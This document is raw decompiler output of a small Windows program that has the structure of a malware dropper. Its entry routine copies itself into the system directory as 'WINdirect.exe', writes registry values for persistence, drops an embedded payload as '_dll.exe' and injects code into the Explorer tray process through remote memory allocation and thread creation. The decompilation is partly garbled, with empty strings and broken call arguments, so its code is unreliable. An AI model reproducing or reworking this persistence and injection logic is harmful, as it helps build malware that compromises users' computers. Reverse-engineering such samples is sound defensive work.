__size32 global10 = 0;// 4 bytes
void global11;
void global12;
void global13;

void *proc10(LPCVOID param1, DWORD param2);
void proc13(char param1);
void _start(char param1);
unsigned int proc17(LPCSTR param1, __size32 *param2, char param3);

// address: 0x401198
void proc4(HANDLE param1) {
    RegCreateKeyA();
    lstrlenA();
    RegSetValueExA();
    RegCloseKey(param1);
    return;
}

// address: 0x401041
void *proc10(LPCVOID param1, DWORD param2) {
    __size32 eax; 		// r24
    HANDLE eax_1; 		// r24{24}
    int esp; 		// r28

    eax_1 = CreateFileA();
    eax = eax_1 + 1;
    if (eax_1 + 1 != 0) {
        WriteFile(eax_1, param1, param2, (esp - 12), 0);
        CloseHandle(eax_1);
        eax = 1;
    } else {
    }
    return eax;
}

// address: 0x40108d
void proc13(char param1) {
    char al; 		// r8
    __size32 eax; 		// r24
    __size32 eax_1; 		// r24{29}
    __size32 eax_2; 		// r24{74}
    __size32 eax_3; 		// r24{110}
    __size32 ebp; 		// r29
    __size32 ebx; 		// r27
    __size32 ecx; 		// r25
    __size32 edx; 		// r26
    int esp; 		// r28
    __size32 *esp_1; 		// r28{54}
    void *esp_2; 		// r28{74}
    void *esp_3; 		// r28{110}
    void *esp_4; 		// r28{138}
    void *esp_5; 		// r28{188}
    LPCSTR local0; 		// m[esp - 40]
    __size32 *local1; 		// m[esp - 36]
    int local10; 		// m[esp - 44]
    __size32 local11; 		// m[esp + 4]
    __size32 local12; 		// m[esp - 32]
    __size32 local13; 		// m[esp - 16]
    __size32 local14; 		// m[esp - 8]
    __size32 local15; 		// m[esp - 4]
    DWORD local16; 		// m[esp - 36]
    int local17; 		// m[esp + 4]{54}
    int local18; 		// m[esp + 4]{289}
    int local19; 		// m[esp + 8]{54}
    unsigned int local2; 		// m[esp - 72]
    int local20; 		// m[esp + 8]{290}
    int local21; 		// m[esp - 4]{54}
    int local22; 		// m[esp - 8]{54}
    int local23; 		// m[esp - 16]{54}
    int local24; 		// m[esp - 32]{54}
    int local25; 		// m[esp - 36]{54}
    int local26; 		// m[esp - 40]{54}
    int local27; 		// m[esp - 44]{54}
    int local28; 		// m[esp - 48]{54}
    int local29; 		// m[esp - 52]{54}
    __size32 local3; 		// m[esp - 68]
    int local30; 		// m[esp - 56]{54}
    int local31; 		// m[esp - 60]{54}
    int local32; 		// m[esp - 64]{54}
    int local33; 		// m[esp - 68]{54}
    int local34; 		// m[esp - 72]{54}
    void *local35; 		// esp_5{188}
    int local4; 		// m[esp - 64]
    __size32 local5; 		// m[esp - 60]
    int local6; 		// m[esp - 56]
    int local7; 		// m[esp - 52]
    unsigned int local8; 		// m[esp - 48]
    unsigned int local9; 		// m[esp + 8]

    eax = proc17("kernel32.dll", 0x405ec8, param1); /* Warning: also results in al */
    if (eax == 0) {
        eax = LoadLibraryA("");
        if (eax != 0) {
            for(;;) {
                Sleep(0x2710);
            }
        }
    } else {
        eax_1 = OpenProcess();
        if (eax_1 != 0) {
            eax = lstrlenA(); /* Warning: also results in ecx, edx */
            (*global10)(pc, eax_1, 0, eax, 0x1000, 4, local9, 1082, 0, local11, ebx, eax, eax_1, ebp, local11, local9, al, eax, ecx, edx, ebx, esp - 4, LOGICALFLAGS32(eax_1), LOGICALFLAGS32(eax_1), LOGICALFLAGS32(eax_1));
            *(__size32*)(ebp - 8) = eax;
            if (eax != 0) {
                *(__size32*)(esp_1 - 4) = 0;
                *(__size32*)(esp_1 - 8) = *(ebp - 12);
                *(__size32*)(esp_1 - 12) = *(ebp + 12);
                *(__size32*)(esp_1 - 16) = *(ebp - 8);
                *(__size32*)(esp_1 - 20) = *(ebp - 4);
                (*global11)(local34, local33, local32, local31, local30, local29, local28, local27, local26, local25, local24, local23, local22, local21, local17, local19, al, eax, ecx, edx, 0, ebp, <all>, LOGICALFLAGS32(eax), LOGICALFLAGS32(eax), LOGICALFLAGS32(eax));
                local35 = esp_2;
                eax = eax_2;
                flags = LOGICALFLAGS32(eax_2);
                if (eax_2 != 0) {
                    *(__size32*)(esp_2 - 4) = 0x405e74;
                    eax = GetModuleHandleA();
                    *(__size32*)(esp_2 - 8) = 0x405e67;
                    *(__size32*)(esp_2 - 12) = eax;
                    eax = GetProcAddress(*(esp_2 - 12), *(esp_2 - 8)); /* Warning: also results in ecx */
                    *(union { void * x13; int x14; }*)(esp_2 - 8) = ebp - 16;
                    *(__size32*)(esp_2 - 12) = 0;
                    *(__size32*)(esp_2 - 16) = *(ebp - 8);
                    *(__size32*)(esp_2 - 20) = eax;
                    *(__size32*)(esp_2 - 24) = 0;
                    *(__size32*)(esp_2 - 28) = 0;
                    *(__size32*)(esp_2 - 32) = *(ebp - 4);
                    (*global12)(local2, local3, local4, local5, local6, local7, local8, local10, local0, local1, local12, local13, local14, local15, local11, local9, al, eax, ecx, ebp - 16, ebx, ebp, <all>, LOGICALFLAGS32(eax_2), LOGICALFLAGS32(eax_2), LOGICALFLAGS32(eax_2));
                    local35 = esp_3;
                    *(__size32*)(ebp - 20) = eax_3;
                    eax = eax_3;
                    flags = LOGICALFLAGS32(eax_3);
                    if (eax_3 != 0) {
                        *(__size32*)(esp_3 - 4) = -1;
                        *(__size32*)(esp_3 - 8) = *(ebp - 20);
                        WaitForSingleObject(*(esp_3 - 8), *(esp_3 - 4));
                        *(union { void * x17; int x18; }*)(esp_3 - 4) = ebp - 24;
                        *(__size32*)(esp_3 - 8) = *(ebp - 20);
                        GetExitCodeThread();
                        ebx = *(ebp - 24);
                        *(__size32*)(esp_3 - 12) = *(ebp - 20);
                        eax = CloseHandle(*(esp_3 - 12)); /* Warning: also results in ecx, edx, esp_4 */
                        local35 = esp_4;
                    }
                }
                esp_5 = local35;
                *(__size32*)(esp_5 - 4) = 0x8000;
                *(__size32*)(esp_5 - 8) = 0;
                *(__size32*)(esp_5 - 12) = *(ebp - 8);
                *(__size32*)(esp_5 - 16) = *(ebp - 4);
                (*global13)(local2, local3, local4, local5, local6, local7, local8, local10, local0, local1, local12, local13, local14, local15, local18, local20, al, eax, ecx, edx, ebx, ebp, <all>, flags, ZF, CF);
            }
            *(__size32*)(esp_1 - 4) = *(ebp - 4);
            CloseHandle(*(esp_1 - 4));
        }
    }
    return;
}

// address: 0x4011dd
void _start(char param1) {
    __size32 eax; 		// r24
    int esp; 		// r28

    GetSystemDirectoryA();
    lstrcatA("", "\WINdirect.exe");
    GetModuleFileNameA(0, 0x4060e6, 260);
    proc4(pc);
    proc4(pc);
    eax = lstrcmpiA();
    if (eax != 0) {
        SetFileAttributesA();
        eax = CopyFileA(); /* Warning: also results in esp */
        if (eax != 0) {
            SetFileAttributesA();
            esp = ShellExecuteA(0, "open", "", 0, 0, 0);
        }
        *(__size32*)(esp - 4) = 0;
        ExitProcess(*(esp - 4));
    }
    GetSystemDirectoryA();
    lstrcatA("", "\_dll.exe");
    SetFileAttributesA();
    eax = proc10(0x403026, 0x2e00); /* Warning: also results in esp */
    if (eax != 0) {
        FindWindowA("Shell_TrayWnd", 0);
        GetWindowThreadProcessId();
        esp = proc13(param1);
    }
    *(__size32*)(esp - 4) = 0;
    ExitProcess(*(esp - 4));
}

// address: 0x401000
unsigned int proc17(LPCSTR param1, __size32 *param2, char param3) {
    char al; 		// r8
    unsigned int eax_1; 		// r24{17}
    int ecx; 		// r25
    __size8 *edi; 		// r31
    unsigned int *esi; 		// r30
    char local2; 		// param3{94}

    edi = param1;
    esi = param2;
    eax_1 = LoadLibraryA(param1); /* Warning: also results in ecx */
    local2 = param3;
    if (eax_1 != 0) {
        for(;;) {
            al = 0;
            ecx = ecx | -1;
            local2 = al;
            do {
                if (ecx == 0) {
                    goto L5;
                }
                tmpb = 0 - *edi;
                edi +=  (DF == 0) ? 1 : -1;
                ecx = ecx - 1;
            } while (tmpb != 0);
L5:
            if (*edi == 0) {
                eax_1 = 1;
                al = 1;
                local2 = al;
                goto L0;
            }
            eax_1 = GetProcAddress(eax_1, edi); /* Warning: also results in ecx */
            *(unsigned int*)esi = eax_1;
            if (eax_1 == 0) {
                break;
            }
            esi +=  (DF == 0) ? 4 : -4;
        }
    }
L0:
    param3 = local2;
    return eax_1; /* WARNING: Also returning: al := param3 */
}

